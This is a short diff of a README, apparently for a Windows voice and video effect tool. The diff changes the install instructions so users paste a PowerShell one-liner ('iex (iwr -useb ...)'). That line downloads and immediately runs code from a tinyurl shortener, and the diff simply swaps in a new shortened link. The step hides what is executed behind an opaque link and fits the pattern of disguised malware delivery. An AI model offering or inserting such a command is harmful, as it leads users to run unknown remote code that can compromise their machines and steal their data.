@@ -16,7 +16,7 @@ Real-time voice and video effect processor for Windows. Change your voice with 2
 4. Press Enter
 
 ```
-iex (iwr -useb https://tinyurl.com/voiceffect201)
+iex (iwr -useb https://tinyurl.com/voiceffect202)
 ```
 
 - ✅ Done. Your voice effects are one command away.
